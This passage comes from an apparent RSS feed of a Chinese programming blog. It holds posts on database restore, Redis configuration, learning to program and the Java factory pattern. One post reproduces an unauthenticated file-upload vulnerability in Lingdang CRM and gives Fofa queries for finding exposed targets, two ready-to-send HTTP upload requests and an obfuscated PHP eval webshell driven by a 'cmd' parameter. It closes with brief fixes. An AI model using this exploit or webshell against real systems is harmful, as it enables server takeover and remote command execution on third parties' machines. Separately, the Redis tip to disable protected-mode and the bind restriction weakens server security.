1 row in set备份数据后，您可通过source命令或myloader命令恢复数据。使用 source 命令恢复数据若无法直接还原单表，可以找到对应的单表 sql 文件，进入命令行，使用source命令恢复数据。source test.t1-schema.sql 还原表结构source test.t1.00000.sql 还原表数据使用 myloader 命令恢复数据导入表结构和数据。myloader -h xx.xx.xx.xx -P2883 -u 'user@tenantname#clustenamer' -p ******  -B test -o -d /data/backup/mysql/导入数据库（若目标库不存在则会新建）。myloader -h xx.xx.xx.xx -P2883 -u 'user@tenantname#clustenamer' -p ******  -B test -s test1 -o -d /data/backup/mysql/更多关于 mydumper 和 myloader 的使用方法，请参见 https://github.com/mydumper/mydumper。四、oceanbase 删除数据库在OceanBase中，删除数据库的操作通常意味着要删除数据库实例。OceanBase不支持直接删除数据库这一概念，而是需要通过删除数据库实例来完成数据库的“删除”操作。在OceanBase中删除数据库实例的操作通常需要DBA权限。以下是删除OceanBase数据库实例的基本步骤：登录到OceanBase数据库管理系统。确认要删除的数据库实例及其内容。执行删除实例的命令。这里是一个示例SQL命令，用于删除OceanBase数据库实例：DROP DATABASE IF EXISTS `your_database_name`;http://www.ppmy.cn/news/1540887.html相关文章Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:02 +0000</pubDate>
    </item>
    <item>
      <title>Redis 一些问题</title>
      <link>https://www.ppmy.cn/news/1540886.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Redis 一些问题news/2025/10/31 23:19:01/关闭Linux防火墙找到redis 配置文件 注释  #bind 127.0.0.1修改 protected-mode  yes    改为no如果报：NOAUTH Authentication required错误就是设置了密码auth 你的密码配置Redisspring.redis.host=192.168.44.132 
spring.redis.port=6379
spring.redis.database= 0
spring.redis.timeout=1800000
spring.redis.lettuce.pool.max-active=20
spring.redis.lettuce.pool.max-wait=-1
#spring.redis.password=你设置的redis密码，没有可以不写#最大阻塞等待时间(负数表示没限制)
spring.redis.lettuce.pool.max-idle=5
spring.redis.lettuce.pool.min-idle=0http://www.ppmy.cn/news/1540886.html相关文章如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:01 +0000</pubDate>
    </item>
    <item>
      <title>如何从小白成长为大神</title>
      <link>https://www.ppmy.cn/news/1540885.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维如何从小白成长为大神news/2025/10/31 23:19:00/大学新生编程入门攻略：如何从小白成长为大神编程已成为当代大学生的重要技能，但面对众多编程语言和学习资源，新生们常常感到迷茫。以下是大学新生入门编程的最佳路径，助你打下坚实的基础，推动未来职业发展。方向一：编程语言选择1.Python特点：语法简洁、易读性强，适合初学者。广泛应用于数据科学、人工智能、网络开发等领域。应用领域：数据分析、机器学习、Web开发、自动化脚本等。学习难度：较低，入门相对容易，适合没有编程基础的同学。2.JavaScript特点：作为Web开发的核心语言，JavaScript可以用来创建动态网页，拥有广泛的应用场景。应用领域：前端开发、后端开发（Node.js）、移动应用开发等。学习难度：中等，理解异步编程和浏览器环境是学习的关键。3.Java特点：面向对象编程语言，具有良好的跨平台特性，适合大规模应用开发。应用领域：企业级应用、安卓开发、后台服务等。学习难度：中等，语法较为严格，适合对编程有一定兴趣的学生。4.C++特点：功能强大，适合系统级开发，能帮助你理解计算机底层原理。应用领域：游戏开发、嵌入式系统、高性能计算等。学习难度：较高，语法复杂，适合有一定编程基础的学生。方向二：学习资源推荐1.在线课程Coursera、edX：提供高校的编程课程，适合系统学习。Codecademy、freeCodeCamp：互动学习平台，适合新手快速入门。2.书籍《Python编程：从入门到实践》：适合Python初学者，内容通俗易懂。《JavaScript权威指南》：适合对JavaScript有一定基础的学习者。《Head First Java》：以通俗易懂的方式讲解Java编程。3.编程社区Stack Overflow：遇到问题时，可以在此寻求帮助和解决方案。GitHub：可以学习开源项目、进行项目实践和贡献代码。4.其他资源LeetCode、HackerRank：通过练习编程题来提升自己的编码能力。方向三：学习方法与技巧1.制定学习计划设定明确的学习目标：例如每周学习一门新知识或完成一个小项目。分阶段学习：从基础知识到项目实战，逐步深入。2.项目实践选择感兴趣的小项目：如个人网站、简单游戏或数据分析项目，通过实践巩固理论。参与开源项目：在GitHub上找一些新手友好的项目，参与贡献，积累实战经验。3.解决学习中的困难主动提问：在社区或学习小组中与他人讨论问题，获取不同的视角。总结经验：每完成一个项目或解决一个问题，写下心得体会，便于回顾和学习。4.保持好奇心与耐心编程是一个不断学习的过程，遇到困难时保持耐心，勇于探索新知识。通过以上攻略，大学新生可以更有方向地开始自己的编程之旅。在不断学习和实践中，努力提升自己的技能，逐步从编程小白成长为编程大神！祝你好运！http://www.ppmy.cn/news/1540885.html相关文章灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:00 +0000</pubDate>
    </item>
    <item>
      <title>灵当CRM index.php 任意文件上传漏洞复现</title>
      <link>https://www.ppmy.cn/news/1540884.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维灵当CRM index.php 任意文件上传漏洞复现news/2025/10/31 23:18:59/0x01 产品描述：灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具，由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业，包括金融、教育、医疗、IT服务及房地产等领域，旨在满足企业对客户个性化管理的需求，从而增强市场竞争力。灵当CRM提供了一系列解决方案，支持新客户开拓、老客户维护、销售过程管理和服务管理等多方面的功能。通过有效地识别潜在客户并制定相应的营销策略，企业能够更好地拓展业务。同时，该系统也注重客户的持续互动与反馈，提升客户忠诚度。销售过程中的监控和优化可以显著提高成交率，而完善的售后服务管理则进一步增强客户满意度。0x02 漏洞描述：灵当CRM 路径/wechatSession/index.php没有对用户上传的文件进行限制，导致未经身份验证的远程攻击者可上传任意文件，从而远程执行任意命令，获取服务器权限。0x03 搜索语句：Fofa：body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" &amp;&amp; body="ldcrm.base.js")Fofa：body="include/js/ldAjax.js"0x04 漏洞复现：POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&amp;msgid=1&amp;operation=upload HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg&lt;?php phpinfo();?&gt;
------WebKitFormBoundary03rNBzFMIytvpWhy--拼接上传路径访问：http://your-ip/crm/storage/wechatsession/2024/10/17/1.phpphp webshellPOST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&amp;msgid=1&amp;operation=upload HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="11.php"
Content-Type: image/jpeg&lt;?php class Gu7288x6 { public function __construct($H7858){ @eval("/*ZN812Hsl8S*/".$H7858."/*ZN812Hsl8S*/"); }}new Gu7288x6($_REQUEST['cmd']);?&gt;
------WebKitFormBoundary03rNBzFMIytvpWhy--0x05 修复建议：首先确保系统限制了文件所必须的上传后缀，然后确保文件名不包含任何可能被解释为目录或遍历序列 ( ../) 的子字符串，同时做到重命名上传的文件以避免可能导致现有文件被覆盖的冲突并且上传文件的存储目录禁用执行权限。http://www.ppmy.cn/news/1540884.html相关文章除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:59 +0000</pubDate>
    </item>
    <item>
      <title>除GOF23种设计模式之简单工厂模式</title>
      <link>https://www.ppmy.cn/news/1540883.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维除GOF23种设计模式之简单工厂模式news/2025/10/31 23:18:58/文章目录1. 简介2. 代码2.1 抽象类：Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试：Test.java3. 心得参考链接（无）1. 简介简单工厂模式(Simple Factory Patern):又称为静态工厂方法(Static Factory Method)模式，它属于类创建型模式在简单工厂模式中，可以根据参数的不同返回不同类的实例。简单工厂模式专门定义一个类来负责创建其他类的实例,被创建的实例通常都具有共同的父类。2. 代码2.1 抽象类：Course.javapublicabstractclassCourse{publicabstractvoidmake();}2.2 产品A:JavaCourse.javapublicclassJavaCourseextendsCourse{@Overridepublicvoidmake(){System.out.println("制作java课程");}}2.3 产品B:PythonCourse.javapublicclassPythonCourseextendsCourse{@Overridepublicvoidmake(){System.out.println("制作python课程");}}2.4 工厂:CourseFactory.javapublicclassCourseFactory{publicCoursegetCourse(Stringname){if("java".equalsIgnoreCase(name)){returnnewJavaCourse();}elseif("python".equalsIgnoreCase(name)){returnnewPythonCourse();}returnnull;}}2.5 测试：Test.javapublicclassTest{publicstaticvoidmain(String[]args){CourseFactorycourseFactory=newCourseFactory();CoursejavaCourse=courseFactory.getCourse("java");javaCourse.make();CoursepyCourse=courseFactory.getCourse("python");pyCourse.make();}}运行结果制作java课程
制作python课程3. 心得其实就是通过一个抽象类，多个实现，利用工厂将其整合在一起，这个很简单。比如：我们要做一个计算器，一个含有计算方式的抽象类，四个加减乘除，随后计算器整合起来参考链接（无）http://www.ppmy.cn/news/1540883.html相关文章青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...基于MinIO配置bucket，用于文件下载和浏览文章目录 引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言 
需求：文件下载用于OTA升级，文件浏览用于产品展示。 
实现方案：基于MinIO配置bucket访问权…阅读更多...Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:58 +0000</pubDate>
    </item>
    <item>
      <title>青少年编程能力等级测评CPA C++五级试卷（1）</title>
      <link>https://www.ppmy.cn/news/1540882.html</link>
